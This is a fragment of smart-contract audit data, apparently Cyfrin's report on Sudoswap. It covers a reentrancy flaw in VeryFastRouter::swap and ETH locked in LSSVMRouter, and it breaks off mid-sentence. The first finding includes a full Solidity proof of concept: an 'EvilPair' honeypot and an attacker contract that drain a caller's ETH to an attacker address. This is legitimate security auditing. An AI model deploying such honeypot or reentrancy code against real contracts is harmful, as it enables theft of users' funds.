      "content": "**Description:**\n[`VeryFastRouter::swap`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L266) is the main entry point for a user to perform a batch of sell and buy orders on the new Sudoswap router, allowing partial fill conditions to be specified. Sell orders are executed first, followed by buy orders. The `LSSVMPair` contracts themselves are implemented in such a way that re-entrance is not possible, but the same is not true of the `VeryFastRouter`. Assuming a user calls `VeryFastRouter::swap`, selling some NFTs and passing in some additional ETH value for subsequent buy orders, an attacker can re-enter this function under certain conditions to steal the original caller's funds. Given that this function does not check whether the user input contains valid pairs, an attacker can use this to manipulate the return values of `LSSVMPair::swapNFTsForToken` and `LSSVMPair::swapTokenForSpecificNFTs`, which interferes with internal accounting. In this way, the attacker can make it appear that a buy/sell order input/output more/less value than expected.\n\nConsider the case where the attacker is a malicious royalty recipient, and their re-entrant swap order contains a single sell order and an empty array of buy orders. Calling out to their malicious pair gives control over the [`outputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L296) value which is used in addition assignment to the [virtual balance](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L301-L302) `ethAmount` used to [transfer any remaining ETH](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L482-L486) after all orders have been executed, filled partially or otherwise. The current contract balance is the original caller's remaining ETH value, so the attacker would intend to have their malicious pair return this amount to drain the funds. However, without the introduction of a malicious pair contract to both the attacker's re-entrant order and the original caller's order, the attacker is prevented from stealing the remaining intermediate funds due to the safe ETH transfer of `ethAmount` as this will cause the original caller's transaction to revert at this same line - the contract is attempting to transfer balance that it no longer has. If this had instead been a transfer of the contract balance directly rather than a virtual balance, then the attacker could have succeeded in stealing the user's funds without baiting them into making a call to their malicious pair. Of course, calling a malicious pair allows it to steal any funds sent with the call, but given that this can manipulate internal accounting through an incorrect return value, as described above, calling this pair can impact other swap orders/partial fills, tricking the contract into thinking it has fewer funds than it does during the lifetime of the original caller's transaction such that the attacker can re-enter and make away with their ETH. Otherwise, the extent of this vulnerability is a DoS attack on calls to the router.\n\nThe steps to perform this exploit are as follows:\n\n* Trick the caller into including an order on the attacker's malicious pair.\n* The attacker re-enters, passing an order of sell orders and calling back to their malicious pair contract due to unvalidated user input. This inflates the `outputAmount`, which in turn inflates the `ethAmount` for their call.\n* Excess ETH is sent to the attacker.\n* The malicious pair manipulates `ethAmount` by returning a large `inputAmount`.\n* Original caller has any additional partial buy orders fail to fill and receives no ETH in return for selling their NFTs.\n\nThe second exploit case is where the caller specifies the router contract as their token recipient, performing DIY recycle ETH functionality of sorts for subsequent buy orders, likely with zero input `msg.value`. This would allow an attacker to steal intermediate balances by re-entering the final sell order before any funds are consumed by buy orders, as these funds are not tracked by `ethAmount`, and so the final transfer will not revert. Independent of a malicious royalty recipient, this also means that any excess ETH sent not consumed by subsequent buy orders will remain locked in the contract if the caller specifies the router contract as their token recipient. Pool funds are safe due to the use of the factory re-entrance guard, which prohibits calling into any of the pair swap functions that are responsible for transfers to the router. ETH value sent with ERC-20-based swaps due to user misconfiguration is also vulnerable in the case of malicious royalty recipient.\n\n**Proof of Concept:**\nThe following diff demonstrates a honeypot pair which re-enters the swap and drains the original caller's ETH:\n\n```diff\ndiff --git a/src/VeryFastRouter.sol b/src/VeryFastRouter.sol\nindex 16047b9..2bd3797 100644\n--- a/src/VeryFastRouter.sol\n+++ b/src/VeryFastRouter.sol\n@@ -85,6 +85,7 @@ contract VeryFastRouter {\n     error VeryFastRouter__InvalidPair();\n     error VeryFastRouter__BondingCurveQuoteError();\n\n+   event vfr_log_named_uint         (string key, uint val);\n     constructor(ILSSVMPairFactoryLike _factory) {\n         factory = _factory;\n     }\n@@ -403,12 +404,12 @@ contract VeryFastRouter {\n\n                 // Deduct ETH amount if it's an ETH swap\n                 if (order.ethAmount != 0) {\n-                    console.log(\"deducting eth amount\");\n-                    console.log(\"before: %s\", ethAmount);\n+                    // console.log(\"deducting eth amount\");\n+                    // console.log(\"before: %s\", ethAmount);\n                     ethAmount -= inputAmount;\n-                    console.log(\"after: %s\", ethAmount);\n-                    console.log(\"router balance: %s\", address(this).balance);\n-                    console.log(\"sender balance: %s\", msg.sender.balance);\n+                    // console.log(\"after: %s\", ethAmount);\n+                    // console.log(\"router balance: %s\", address(this).balance);\n+                    // console.log(\"sender balance: %s\", msg.sender.balance);\n                 }\n             }\n             // Otherwise, we need to do some partial fill calculations first\n@@ -488,10 +489,15 @@ contract VeryFastRouter {\n         }\n\n         // Send excess ETH back to token recipient\n-        console.log(\"ethAmount: %s\", ethAmount);\n+        emit vfr_log_named_uint(\"eth Amount\", ethAmount);\n+        emit vfr_log_named_uint(\"pair balance before\", address(this).balance);\n+        if(address(this).balance > ethAmount){\n+            emit vfr_log_named_uint(\"pair balance after\", address(this).balance - ethAmount);\n+        }\n+        else{\n+            emit vfr_log_named_uint(\"pair balance after\", 0);\n+        }\n         if (ethAmount != 0) {\n-            console.log(\"balance: %s\", address(this).balance);\n-            console.log(\"transfering %s ETH to: %s\", ethAmount, swapOrder.tokenRecipient);\n             payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); // @audit-ok - doesn't seem to be a case when this is less than the actual amount to refund\n         }\n     }\ndiff --git a/src/test/base/VeryFastRouterAllSwapTypes.sol b/src/test/base/VeryFastRouterAllSwapTypes.sol\nindex 9909271..6294bd2 100644\n--- a/src/test/base/VeryFastRouterAllSwapTypes.sol\n+++ b/src/test/base/VeryFastRouterAllSwapTypes.sol\n@@ -33,6 +33,9 @@ import {RoyaltyEngine} from \"../../RoyaltyEngine.sol\";\n import {VeryFastRouter} from \"../../VeryFastRouter.sol\";\n import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n\n+import {EvilPair} from \"../mixins/EvilPair.sol\";\n+import {EvilPairReentrancyAttacker} from \"../mixins/EvilPairReentrancyAttacker.sol\";\n+\n abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holder, ConfigurableWithRoyalties {\n     ICurve bondingCurve;\n     RoyaltyEngine royaltyEngine;\n@@ -43,6 +46,8 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde\n     address constant ROUTER_CALLER = address(1);\n     address constant TOKEN_RECIPIENT = address(420);\n     address constant NFT_RECIPIENT = address(0x69);\n+    address constant PWNER = payable(address(999));\n+    address constant ALICE = payable(address(666));\n\n     uint256 constant START_INDEX = 0;\n     uint256 constant NUM_BEFORE_PARTIAL_FILL = 2;\n@@ -1286,4 +1291,87 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde\n         }\n         vm.stopPrank();\n     }\n+\n+    function testSwapEvilPairReentrancyAttack_audit() public {\n+        EvilPair evilPair;\n+        EvilPairReentrancyAttacker evilPairReentrancyAttacker;\n+        uint256 totalEthToSend = 100 ether;\n+        deal(ALICE, totalEthToSend);\n+\n+        //0. create a pair with a bonding curve\n+        uint256[] memory nftIds;\n+        LSSVMPair pair;\n+        nftIds = _getArray(START_INDEX, END_INDEX);\n+\n+        // mints END_INDEX - START_INDEX + 1 NFTs\n+        pair = setUpPairERC721ForSale(0, address(0), nftIds);\n+\n+        (uint256 delta, uint256 spotPrice) = getReasonableDeltaAndSpotPrice();\n+\n+\n+        //1. create a honeypotNft that again mints END_INDEX - START_INDEX + 1 nfts\n+        IERC721Mintable honeypotNft = _setUpERC721(address(this), address(this), ALICE);\n+\n+        //2. setup a evilPair & transfer above NFTs to the evilPair\n+        evilPair = new EvilPair(spotPrice, delta, address(pair.bondingCurve()), payable(address(0)), address(honeypotNft));\n+        for (uint256 j; j< nftIds.length; j++){\n+            IERC721(honeypotNft).transferFrom(address(this), address(evilPair), nftIds[j]);\n+        }\n+\n+        // 3. setup evil pair attacker\n+        evilPairReentrancyAttacker = new EvilPairReentrancyAttacker(router, spotPrice, PWNER, address(evilPair));\n+\n+        //4. set the evil pair attacker address as above\n+        evilPair.setAttacker(payable(evilPairReentrancyAttacker));\n+        evilPair.setReentrancyAttack(true); // just a flag to change the logic of setReentrancyAttack and swapNFTsForToken\n+        evilPair.setRouterAddress(payable(router));\n+        uint256[] memory partialFillAmounts = new uint256[](0);\n+\n+        //5. create a buy order so that we can re-enter from swapTokenForSpecificNFTs\n+        VeryFastRouter.BuyOrderWithPartialFill memory attackBuyOrder = VeryFastRouter.BuyOrderWithPartialFill({\n+            pair: LSSVMPair(address(evilPair)),\n+            maxInputAmount: totalEthToSend,\n+            ethAmount:totalEthToSend,\n+            nftIds: nftIds,\n+            expectedSpotPrice: pair.spotPrice(),\n+            isERC721: true,\n+            maxCostPerNumNFTs: partialFillAmounts\n+        });\n+\n+       VeryFastRouter.BuyOrderWithPartialFill[] memory buyOrders =\n+            new VeryFastRouter.BuyOrderWithPartialFill[](1);\n+        buyOrders[0] = attackBuyOrder;\n+\n+        //6. Create a dummy sell order - 0 array\n+        VeryFastRouter.SellOrderWithPartialFill[] memory sellOrders =\n+            new VeryFastRouter.SellOrderWithPartialFill[](0);\n+\n+        //7. Create a swap order\n+         VeryFastRouter.Order memory swapOrder = VeryFastRouter.Order({\n+            buyOrders: buyOrders,\n+            sellOrders: sellOrders,\n+            tokenRecipient: payable(TOKEN_RECIPIENT),\n+            nftRecipient: NFT_RECIPIENT,\n+            recycleETH: true\n+        });\n+\n+        //8. We calculate the price of purchasing ALL NFTs from evil pair for given bonding curve\n+        // ignore royalties for this calculation\n+        // initial balance of ALICE (100 ether) - input Amount should be the final balance in ALICE account after swap\n+        // by re-entering and placing a fake buy txn, we can drain all of ALICE's eth\n+        (, , , uint256 inputAmount, ,) = ICurve(pair.bondingCurve()).getBuyInfo(uint128(spotPrice), uint128(delta), nftIds.length, 0, 0);\n+\n+        emit log_named_uint(\"input amount to purchase all NFTs \", inputAmount);\n+        emit log_named_uint(\"Balance in Alice Account Before \", ALICE.balance);\n+        emit log_named_uint(\"Balance in Pwner Account Before \", PWNER.balance);\n+        emit log_named_uint(\"Balance in Router Account Before \", address(router).balance);\n+\n+        // 8. Perform the swap\n+        vm.prank(ALICE);\n+        router.swap{value: totalEthToSend}(swapOrder);\n+\n+        emit log_named_uint(\"Balance in Alice Account After \", ALICE.balance);\n+        emit log_named_uint(\"Balance in Pwner Account After \", PWNER.balance);\n+        emit log_named_uint(\"Balance in Router Account After \", address(router).balance);\n+    }\n }\ndiff --git a/src/test/mixins/EvilPair.sol b/src/test/mixins/EvilPair.sol\nnew file mode 100644\nindex 0000000..8a8ad6d\n--- /dev/null\n+++ b/src/test/mixins/EvilPair.sol\n@@ -0,0 +1,119 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import {console} from \"forge-std/Test.sol\";\n+import {EvilPairReentrancyAttacker} from \"./EvilPairReentrancyAttacker.sol\";\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+\n+contract EvilPair {\n+    uint256 expectedSpotPrice;\n+    uint256 expectedDelta;\n+    address public bondingCurve;\n+    address payable attacker;\n+    uint256 counter;\n+    uint256 inputAmount;\n+    address nftAddress;\n+    address payable routerAddress;\n+    bool isReentrancyAttack;\n+\n+   event evilpair_log_named_uint         (string key, uint val);\n+   event evilpair_log_named_address      (string key, address val);\n+\n+    constructor(uint256 _expectedSpotPrice, uint256 _delta, address _bondingCurve, address payable _attacker, address _nft) {\n+        expectedSpotPrice = _expectedSpotPrice;\n+        expectedDelta = _delta;\n+        bondingCurve = _bondingCurve;\n+        attacker = _attacker;\n+        nftAddress = _nft;\n+    }\n+\n+    function setAttacker(address payable _attacker) public {\n+        attacker = _attacker;\n+    }\n+\n+    function setReentrancyAttack(bool _isAttack) public{\n+        isReentrancyAttack = _isAttack;\n+    }\n+\n+    function setRouterAddress(address payable _router) public{\n+        routerAddress = _router;\n+    }\n+\n+    function swapNFTsForToken(\n+        uint256[] calldata nftIds,\n+        uint256 minExpectedTokenOutput,\n+        address payable tokenRecipient,\n+        bool isRouter,\n+        address routerCaller\n+    ) external virtual returns (uint256) {\n+        if(isReentrancyAttack){\n+            //calculate price of original purchase of user\n+            //reserve that amount of eth for original buy txn to go through\n+            // and drain the balance funds\n+\n+            // reserveAmount of eth calculation\n+            uint256 numNfts = IERC721(nftAddress).balanceOf(address(this));\n+            (, , , uint256 inputAmount, ,) = ICurve(bondingCurve).getBuyInfo(uint128(expectedSpotPrice), uint128(expectedDelta), numNfts, 0, 0);\n+            emit evilpair_log_named_uint(\"input amount inside swapNFTForToken \", inputAmount);\n+            emit evilpair_log_named_uint(\"balance eth in evilPair currently \", address(this).balance);\n+\n+\n+            // we ignore royalties for this\n+            if(address(this).balance > inputAmount){\n+                uint256 splitPayment = (address(this).balance - inputAmount)*50/100;\n+                //transfer 50% to the router to enable a payoff\n+                (bool success, ) = address(routerAddress).call{value: splitPayment}(\"\");\n+                return splitPayment;\n+            }\n+            return 0;\n+        }\n+\n+    }\n+\n+    function swapTokenForSpecificNFTs(\n+        uint256[] calldata nftIds,\n+        uint256 maxExpectedTokenInput,\n+        address nftRecipient,\n+        bool isRouter,\n+        address routerCaller\n+    ) external payable virtual returns (uint256) {\n+        uint256 ethAmount = msg.value;\n+        if(isReentrancyAttack){\n+            EvilPairReentrancyAttacker(attacker).attack();\n+\n+        }\n+        else{\n+            sweepETH();\n+        }\n+\n+        return ethAmount;\n+    }\n+\n+    function sweepETH() public {\n+        (bool success, ) = attacker.call{value: address(this).balance}(\"\");\n+        require(success, \"eth sweep success\");\n+    }\n+\n+    function spotPrice() external view virtual returns (uint256) {\n+        return expectedSpotPrice;\n+    }\n+\n+    function delta() external view virtual returns (uint256) {\n+        return expectedDelta;\n+    }\n+\n+    function fee() external view virtual returns (uint256) {\n+        return 0;\n+    }\n+\n+    function nft() external view virtual returns (address) {\n+        return nftAddress;\n+    }\n+\n+    function calculateRoyaltiesView(uint256 assetId, uint256 saleAmount)\n+        public\n+        view\n+        returns (address payable[] memory royaltyRecipients, uint256[] memory royaltyAmounts, uint256 royaltyTotal)\n+    {}\n+}\n\\ No newline at end of file\ndiff --git a/src/test/mixins/EvilPairReentrancyAttacker.sol b/src/test/mixins/EvilPairReentrancyAttacker.sol\nnew file mode 100644\nindex 0000000..019019f\n--- /dev/null\n+++ b/src/test/mixins/EvilPairReentrancyAttacker.sol\n@@ -0,0 +1,79 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {VeryFastRouter} from \"../../VeryFastRouter.sol\";\n+\n+import {console} from \"forge-std/Test.sol\";\n+\n+contract EvilPairReentrancyAttacker {\n+    VeryFastRouter immutable internal router;\n+    uint256 immutable internal expectedSpotPrice;\n+    address immutable internal PWNER;\n+    address immutable internal evilPair;\n+    uint256 counter;\n+\n+    constructor(VeryFastRouter _router, uint256 _expectedSpotPrice, address _pwner, address _evilPair) {\n+        router = _router;\n+        expectedSpotPrice = _expectedSpotPrice;\n+        PWNER = _pwner;\n+        evilPair = _evilPair;\n+    }\n+\n+    fallback() external payable {\n+        // console.log(\"entered fallback\");\n+        // if (msg.sig == this.attack.selector) {\n+        //     console.log(\"doing attack\");\n+        //     attack();\n+        //     return;\n+        // }\n+        // if (++counter == 2) {\n+        //     console.log(\"doing attack\");\n+        //     attack();\n+        // } else {\n+        //     console.log(\"doing nothing\");\n+        //     return;\n+        // }\n+    }\n+\n+    receive() external payable {}\n+\n+    function attack() public {\n+        console.log(\"executing attack\");\n+        VeryFastRouter.BuyOrderWithPartialFill[] memory attackBuyOrders = new VeryFastRouter.BuyOrderWithPartialFill[](0);\n+        VeryFastRouter.SellOrderWithPartialFill[] memory attackSellOrders = new VeryFastRouter.SellOrderWithPartialFill[](1);\n+        uint256[] memory nftInfo = new uint256[](1);\n+        nftInfo[0] = 1337;\n+        uint256[] memory empty = new uint256[](0);\n+\n+        attackSellOrders[0] = VeryFastRouter.SellOrderWithPartialFill({\n+            pair: LSSVMPair(evilPair),\n+            isETHSell: true,\n+            isERC721: true,\n+            nftIds: nftInfo,\n+            doPropertyCheck: false,\n+            propertyCheckParams: \"\",\n+            expectedSpotPrice: expectedSpotPrice < type(uint128).max ? uint128(expectedSpotPrice) : type(uint128).max,\n+            minExpectedOutput: 0,\n+            minExpectedOutputPerNumNFTs: empty\n+        });\n+\n+        VeryFastRouter.Order memory attackSwapOrder = VeryFastRouter.Order({\n+            buyOrders: attackBuyOrders,\n+            sellOrders: attackSellOrders,\n+            tokenRecipient: payable(PWNER),\n+            nftRecipient: PWNER,\n+            recycleETH: true\n+        });\n+\n+\n+        router.swap(attackSwapOrder);\n+\n+        console.log(\"completed attack\");\n+    }\n+\n+    function sweepETH() public {\n+        (bool success, ) = PWNER.call{value: address(this).balance}(\"\");\n+        require(success, \"sweep eth failed\");\n+    }\n+}\n\\ No newline at end of file\n```\n\n**Impact:**\nThis vulnerability results in the loss of user funds, with high impact and medium likelihood, so we evaluate the severity to HIGH.\n\n**Recommended Mitigation:**\nValidate user inputs to `VeryFastRouter::swap`, in particular pairs, and consider making this function non-reentrant.\n\n**Sudoswap:**\nAcknowledged, no change for now as risk surface is set to callers passing in improper arguments. Pair validation is done client-side, so less of a concern.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "\nA vulnerability has been discovered in the `VeryFastRouter::swap` function in the new Sudoswap router, which allows an attacker to steal the original caller's funds. The vulnerability occurs when a user calls the `VeryFastRouter::swap` function to sell some NFTs and pass in some additional ETH value for subsequent buy orders. The attacker can re-enter this function under certain conditions and manipulate the return values of `LSSVMPair::swapNFTsForToken` and `LSSVMPair::swapTokenForSpecificNFTs`, which interferes with internal accounting. This allows the attacker to make it appear that a buy/sell order input/output more/less value than expected, allowing them to make away with the user's funds. \n\nThe attacker can also exploit the vulnerability if the caller specifies the router contract as their token recipient, allowing them to steal intermediate balances. The vulnerability also affects ETH value sent with ERC-20-based swaps due to user misconfiguration if the attacker is a malicious royalty recipient.\n\nThe severity of this vulnerability is rated HIGH due to the high impact and medium likelihood of the resulting loss of user funds. To mitigate this vulnerability, it is recommended to validate user inputs to `VeryFastRouter::swap`, in particular pairs, and consider making this function non-reentrant. Sudoswap and Cyfrin have acknowledged the vulnerability and no change has been made yet as the risk surface is set to callers passing in improper arguments.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18411",
      "title": "Specified `minOutput` will remain locked in `LSSVMRouter::swapNFTsForSpecificNFTsThroughETH`",
      "impact": "HIGH",
      "content": "**Description:**\nThe Cyfrin team understands that `LSSVMRouter` is slightly out of scope for this audit, given that it is intended to be deprecated and replaced by `VeryFastRouter`; however, a slightly modified version of this contract is currently deployed and [live on mainnet](https://etherscan.io/address/0x2b2e8cda09bba9660dca5cb6233787738ad68329#code). We have found a bug in [`LSSVMRouter::swapNFTsForSpecificNFTsThroughETH`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L88) and `LSSVMRouter::swapNFTsForAnyNFTsThroughETH` which has been validated against a mainnet fork to lock user funds sent with the function call as specified by the [`minOutput`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L90) parameter. In other words, users attempting to protect themselves from slippage will find that this causes their funds to become locked - the higher the minimum expected output specified, the higher value of funds locked.\n\nUsers specifying a non-zero `minOutput` value will have this amount [deducted](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L105) from the `inputAmount` sent on the second half of the swap, from ETH to NFTs, handled by the internal functions [`LSSVMRouter::_swapETHForSpecificNFTs`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L560) and `LSSVMRouter::_swapETHForAnyNFTs`. Given that it is the responsibility of these internal functions to issue a refund of any unspent ETH based on this [`inputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L562) parameter, the excess value represented by `minOutput` is not included in the [`remainingValue`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L566) [calculation](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L582) and so will not be included in the subsequent [ETH transfer](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/LSSVMRouter.sol#L591-L595). If there are no intermediate underflows (due to a sufficiently large value of `minOutput`) then any excess ETH as specified by `minOutput` will therefore remain locked in the router forever.\n\nFortunately, it appears these functions have never actually been called on the mainnet deployment as they have not been connected to the Sudoswap front end. While Sudoswap doesn't use these functions on the client, contract-level integrators may find themselves with potentially lost funds, so the Sudorandom Labs team has attempted to reach out to those potentially affected.\n\n**Proof of Concept:**\nApply the following git diff:\n\n```diff\ndiff --git a/src/test/interfaces/ILSSVMPairFactoryMainnet.sol b/src/test/interfaces/ILSSVMPairFactoryMainnet.sol\nnew file mode 100644\nindex 0000000..3cdea5b\n--- /dev/null\n+++ b/src/test/interfaces/ILSSVMPairFactoryMainnet.sol\n@@ -0,0 +1,20 @@\n+// SPDX-License-Identifier: MIT\n+pragma solidity ^0.8.0;\n+\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {LSSVMPairETH} from \"../../LSSVMPairETH.sol\";\n+\n+interface ILSSVMPairFactoryMainnet {\n+    function createPairETH(\n+        IERC721 _nft,\n+        ICurve _bondingCurve,\n+        address payable _assetRecipient,\n+        LSSVMPair.PoolType _poolType,\n+        uint128 _delta,\n+        uint96 _fee,\n+        uint128 _spotPrice,\n+        uint256[] calldata _initialNFTIDs\n+    ) external payable returns (LSSVMPairETH pair);\n+}\ndiff --git a/src/test/mixins/UsingETH.sol b/src/test/mixins/UsingETH.sol\nindex 0e5cb40..8fecb1e 100644\n--- a/src/test/mixins/UsingETH.sol\n+++ b/src/test/mixins/UsingETH.sol\n@@ -14,6 +14,8 @@ import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n import {LSSVMPairERC721} from \"../../erc721/LSSVMPairERC721.sol\";\n import {LSSVMPairERC1155} from \"../../erc1155/LSSVMPairERC1155.sol\";\n\n+import {ILSSVMPairFactoryMainnet} from \"../interfaces/ILSSVMPairFactoryMainnet.sol\";\n+\n abstract contract UsingETH is Configurable, RouterCaller {\n     function modifyInputAmount(uint256 inputAmount) public pure override returns (uint256) {\n         return inputAmount;\n@@ -46,6 +48,25 @@ abstract contract UsingETH is Configurable, RouterCaller {\n         return pair;\n     }\n\n+    function setupPairERC721Mainnet(\n+        ILSSVMPairFactoryMainnet factory,\n+        IERC721 nft,\n+        ICurve bondingCurve,\n+        address payable assetRecipient,\n+        LSSVMPair.PoolType poolType,\n+        uint128 delta,\n+        uint96 fee,\n+        uint128 spotPrice,\n+        uint256[] memory _idList,\n+        uint256,\n+        address\n+    ) public payable returns (LSSVMPair) {\n+        LSSVMPairETH pair = factory.createPairETH{value: msg.value}(\n+            nft, bondingCurve, assetRecipient, poolType, delta, fee, spotPrice, _idList\n+        );\n+        return pair;\n+    }\n+\n     function setupPairERC1155(CreateERC1155PairParams memory params) public payable override returns (LSSVMPair) {\n         LSSVMPairETH pair = params.factory.createPairERC1155ETH{value: msg.value}(\n             params.nft,\ndiff --git a/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol b/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol\nnew file mode 100644\nindex 0000000..596da45\n--- /dev/null\n+++ b/src/test/single-test-cases/CyfrinLSSVMRouterPoC.t.sol\n@@ -0,0 +1,114 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import \"forge-std/Test.sol\";\n+\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {Test721} from \"../../mocks/Test721.sol\";\n+\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+import {ILSSVMPairFactoryMainnet} from \"../interfaces/ILSSVMPairFactoryMainnet.sol\";\n+\n+import {UsingETH} from \"../mixins/UsingETH.sol\";\n+import {ConfigurableWithRoyalties} from \"../mixins/ConfigurableWithRoyalties.sol\";\n+import {LinearCurve, UsingLinearCurve} from \"../../test/mixins/UsingLinearCurve.sol\";\n+\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {LSSVMPairETH} from \"../../LSSVMPairETH.sol\";\n+import {LSSVMRouter} from \"../../LSSVMRouter.sol\";\n+import {RoyaltyEngine} from \"../../RoyaltyEngine.sol\";\n+import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n+\n+\n+contract CyfrinLSSVMRouterPoC is Test, ConfigurableWithRoyalties, UsingLinearCurve, UsingETH {\n+    IERC721 test721;\n+    address payable alice;\n+\n+    LSSVMRouter constant LSSVM_ROUTER = LSSVMRouter(payable(address(0x2B2e8cDA09bBA9660dCA5cB6233787738Ad68329)));\n+    LSSVMPairFactory constant LSSVM_PAIR_FACTORY = LSSVMPairFactory(payable(address(0xb16c1342E617A5B6E4b631EB114483FDB289c0A4)));\n+    LinearCurve constant LINEAR_CURVE = LinearCurve(payable(address(0x5B6aC51d9B1CeDE0068a1B26533CAce807f883Ee)));\n+\n+    function setUp() public {\n+        vm.createSelectFork(vm.envOr(\"MAINNET_RPC_URL\", string.concat(\"https://rpc.ankr.com/eth\")));\n+\n+        test721 = setup721();\n+        alice = payable(makeAddr(\"alice\"));\n+        deal(alice, 1 ether);\n+    }\n+\n+    function test_minOutputIsLockedInRouterWhenCallingswapNFTsForSpecificNFTsThroughETH() public {\n+        Test721(address(test721)).mint(alice, 1);\n+        uint256[] memory nftToTokenTradesIds = new uint256[](1);\n+        nftToTokenTradesIds[0] = 1;\n+        Test721(address(test721)).mint(address(this), 2);\n+        Test721(address(test721)).mint(address(this), 3);\n+        Test721(address(test721)).mint(address(this), 4);\n+        uint256[] memory ids = new uint256[](3);\n+        ids[0] = 2;\n+        ids[1] = 3;\n+        ids[2] = 4;\n+        uint256[] memory tokenToNFTTradesIds = new uint256[](1);\n+        tokenToNFTTradesIds[0] = ids[ids.length - 1];\n+\n+        test721.setApprovalForAll(address(LSSVM_PAIR_FACTORY), true);\n+        LSSVMPair pair721 = this.setupPairERC721Mainnet{value: 10 ether}(\n+            ILSSVMPairFactoryMainnet(address(LSSVM_PAIR_FACTORY)),\n+            test721,\n+            LINEAR_CURVE,\n+            payable(address(0)),\n+            LSSVMPair.PoolType.TRADE,\n+            0.1 ether, // delta\n+            0.1 ether, // 10% for trade fee\n+            1 ether, // spot price\n+            ids,\n+            10 ether,\n+            address(0)\n+        );\n+\n+        uint256 pairETHBalanceBefore = address(pair721).balance;\n+        uint256 aliceETHBalanceBefore = address(alice).balance;\n+        uint256 routerETHBalanceBefore = address(LSSVM_ROUTER).balance;\n+\n+        emit log_named_uint(\"pairETHBalanceBefore\", pairETHBalanceBefore);\n+        emit log_named_uint(\"aliceETHBalanceBefore\", aliceETHBalanceBefore);\n+        emit log_named_uint(\"routerETHBalanceBefore\", routerETHBalanceBefore);\n+\n+        uint256 minOutput;\n+        {\n+            LSSVMRouter.PairSwapSpecific[] memory nftToTokenTrades = new LSSVMRouter.PairSwapSpecific[](1);\n+            nftToTokenTrades[0] = LSSVMRouter.PairSwapSpecific({\n+                pair: pair721,\n+                nftIds: nftToTokenTradesIds\n+            });\n+\n+            LSSVMRouter.PairSwapSpecific[] memory tokenToNFTTrades = new LSSVMRouter.PairSwapSpecific[](1);\n+            tokenToNFTTrades[0] = LSSVMRouter.PairSwapSpecific({\n+                pair: pair721,\n+                nftIds: tokenToNFTTradesIds\n+            });\n+\n+            LSSVMRouter.NFTsForSpecificNFTsTrade memory trade = LSSVMRouter.NFTsForSpecificNFTsTrade({\n+                nftToTokenTrades: nftToTokenTrades,\n+                tokenToNFTTrades: tokenToNFTTrades\n+            });\n+\n+\n+            vm.startPrank(alice);\n+            test721.setApprovalForAll(address(LSSVM_ROUTER), true);\n+            minOutput = 0.79 ether;\n+            LSSVM_ROUTER.swapNFTsForSpecificNFTsThroughETH{value: 1 ether}(trade, minOutput, alice, alice, block.timestamp + 10);\n+        }\n+\n+        uint256 pairETHBalanceAfter = address(pair721).balance;\n+        uint256 aliceETHBalanceAfter = address(alice).balance;\n+        uint256 routerETHBalanceAfter = address(LSSVM_ROUTER).balance;\n+\n+        assertTrue(test721.ownerOf(tokenToNFTTradesIds[0]) == alice);\n+        assertGt(pairETHBalanceAfter, pairETHBalanceBefore);\n+        assertEq(routerETHBalanceAfter, minOutput);\n+\n+        emit log_named_uint(\"pairETHBalanceAfter\", pairETHBalanceAfter);\n+        emit log_named_uint(\"aliceETHBalanceAfter\", aliceETHBalanceAfter);\n+        emit log_named_uint(\"routerETHBalanceAfter\", routerETHBalanceAfter);\n+    }\n+}\n```\n\n**Impact:**\nThis vulnerability results in the 